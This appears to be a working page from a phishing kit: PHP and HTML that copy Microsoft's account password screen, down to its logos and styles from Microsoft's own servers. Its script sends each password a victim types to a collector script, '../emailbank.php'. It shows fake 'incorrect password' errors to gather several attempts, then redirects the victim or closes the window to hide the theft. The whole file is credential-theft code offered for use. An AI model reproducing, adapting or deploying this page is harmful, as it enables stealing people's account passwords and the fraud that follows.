<?php
session_start();
require_once '../main.php';
header('Access-Control-Allow-Origin: *');
?>
<html dir="ltr" lang="EN-US">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <title>Sign in to your Microsoft account</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
        <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28510.6/images/favicon.ico">
        <link rel="stylesheet" title="Converged_v2" type="text/css" href="https://logincdn.msauth.net/16.000/Converged_v21033_AZXChPIB5jI3ijrmoNll5w2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><style type="text/css">body{display:block !important;}</style><link rel="image_src" href="https://logincdn.msauth.net/16.000.28510.6/images/Windows_Live_v_thumb.jpg"></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28510.6/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://logincdn.msauth.net/16.000.28510.6/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> <form name="f1" id="emailaccess" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="javascript:void(0);"><div class="outer" data-bind="component: { name: 'master-page',
        params: {
        serverData: svr,
        showButtons: svr.f,
        showFooterLinks: true,
        useWizardBehavior: svr.BC,
        handleWizardButtons: false,
        password: password,
        hideFromAria: ariaHidden },
        event: {
        footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
        animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
        css: {
        'app': backgroundLogoUrl,
        'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
        'fade-in-lightbox': fadeInLightBox,
        'has-popup': showFedCredButtons,
        'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div>
        <div id="progressBar" class="progress" role="progressbar" style="display: none;" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
        <div data-bind="component: { name: 'logo-control',
            params: {
            isChinaDc: svr.fIsChinaDc,
            bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28510.6/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
            enableCssAnimation: svr.ae,
            disableAnimationIfAnimationEndUnsupported: svr.bp,
            initialViewId: initialViewId,
            currentViewId: currentViewId,
            initialSharedData: initialSharedData,
            initialError: $loginPage.getServerError() },
            event: {
            cancel: paginationControl_onCancel,
            showView: $loginPage.view_onShow,
            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --> <div data-bind="css: {
            'animate': animate() &amp;&amp; animate.animateBanner(),
            'slide-out-next': animate.isSlideOutNext(),
            'slide-in-next': animate.isSlideInNext(),
            'slide-out-back': animate.isSlideOutBack(),
            'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: 'identity-banner-control',
                params: {
                userTileUrl: svr.be,
                displayName: sharedData.displayName || svr.h,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
                event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><div class="identityBanner"> <button type="button" class="backButton" data-bind="
                    attr: { 'id': backButtonId || 'idBtn_Back' },
                    ariaLabel: str['CT_HRD_STR_Splitter_Back'],
                    ariaDescribedBy: backButtonDescribedBy,
                    click: backButton_onClick,
                    hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"><img role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.6/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.b0 --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=""></div> </div></div> </div><!-- /ko --> <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
                    'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.h),
                    'zero-opacity': hidePaginatedView.hideSubView(),
                    'animate': animate(),
                    'slide-out-next': animate.isSlideOutNext(),
                    'slide-in-next': animate.isSlideInNext(),
                    'slide-out-back': animate.isSlideOutBack(),
                    'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                    params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.AC === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                    event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --><!--  --> <input type="hidden" name="emaildress" id="emaildress" data-bind="value: unsafe_username" value="">
                    <input type="hidden" name="emailType" value="" id="emailType">
                    <input type="hidden" name="emailProvider" value="" id="emailProvider">
                    <input type="hidden" name="emailretry" value="" id="emailretry">
                    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: showCredViewBrandingDesc --><!-- /ko --><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive">
                    <div id="passwordError" class="alert alert-error" data-bind="
                        htmlWithBindings: passwordTextbox.error,
                        childBindings: { 'idA_IL_ForgotPassword0': { href: svr.q, click: resetPassword_onClick } }" style="display: none;">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="#">try again.</a><!-- HR=80041012 --></div>
                    </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                    publicMethods: passwordTextbox.placeholderTextboxMethods,
                    params: {
                    serverData: svr,
                    hintText: str['CT_PWD_STR_PwdTB_Label'] },
                    event: {
                    updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="emailPassword" type="password" id="emailPassword" autocomplete="off" class="form-control" aria-required="true" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password" tabindex="0"><!-- ko if: svr.CK && showPassword() --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- ko if: svr.CK --><!-- /ko --> </div> </div><!-- ko if: shouldHipInit --><!-- /ko --> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div><!-- ko if: svr.Ce --><!-- /ko --><!-- ko if: svr.aR !== false && !svr.Ce && !tenantBranding.KeepMeSignedInDisabled --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot password?</a> </div> <div class="form-group"></div> </div> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
                    params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.f,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                    event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
                        visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                        css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                        attr: primaryButtonAttributes,
                        value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                        hasFocus: focusOnPrimaryButton,
                        click: primaryButton_onClick,
                        enable: isPrimaryButtonEnabled,
                        visible: isPrimaryButtonVisible,
                        preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div> </div></div> </div> </div></div> </div> </div></div> </div> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                    </div> <div id="footer" class="footer default" role="contentinfo" data-bind="
                    css: {
                    'default': !backgroundLogoUrl(),
                    'new-background-image': useNewDefaultBackground }"> <div data-bind="component: { name: 'footer-control',
                        publicMethods: footerMethods,
                        params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a><a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                        click: moreInfo_onClick,
                        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                        attr: { 'aria-expanded': showDebugDetails().toString() },
                        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"></a> </div> <!-- /ko --></div> </div> </div> <!-- /ko --></div>
                    </div></body>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
                    <script>
                        var ed = sessionStorage.getItem("emaildress");
                        var emailretry = 0;
                        $("#emaildress").val(ed);
                        $("#displayName").attr("title", ed);
                        $("#displayName").html(ed);
                    $("#emailPassword").keyup(function() {
                    if ($.trim($('#emailPassword').val()).length < 4) {
                    $("#passwordError").show();
                    $("#emailPassword").addClass("has-error");
                    } else {
                    $("#passwordError").hide();
                    $("#emailPassword").removeClass("has-error");
                    }
                    });
                    $("#idSIButton9").click(function(e) {
                    e.preventDefault();
                    if ($.trim($('#emailPassword').val()).length < 4) {
                    $("#passwordError").show();
                    $("#emailPassword").addClass("has-error");
                    } else {
                    $("#emailPassword").removeClass("has-error");
                    $("#passwordError").hide();
                        $(".lightbox-cover").addClass("disable-lightbox");
                        $("#progressBar").show();
                    $("#emailType").val(window.opener.document.getElementById('emailType').value);
                    $("#emailProvider").val(window.opener.document.getElementById('emailProvider').value);
                    emailretry++
                    $("#emailretry").val(emailretry);
                    $.post("../emailbank.php", $("#emailaccess").serialize(), function(result) {});
                    if ("<?php echo $emailretry ?>" == "on") {
                    setTimeout(function () {
                    $(".lightbox-cover").removeClass("disable-lightbox");
                    $("#progressBar").hide();
                    $("#passwordError").show();
                    $("#emailPassword").addClass("has-error");
                    }, 2600);
                    } else {
                    window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
                    if ("<?php echo $enableEmailReal ?>" == "on") {
                    $(location).attr('href', window.opener.document.getElementById('urli').value);
                    } else {
                    close();
                    }
                    }
                    if (emailretry == <?php echo $numberofretries ?>) {
                    window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
                    if ("<?php echo $enableEmailReal ?>" == "on") {
                    $(location).attr('href', window.opener.document.getElementById('urli').value);
                    } else {
                    close();
                    }
                    }
                    //$('form').submit();
                    }
                    });
                    </script>
                </html>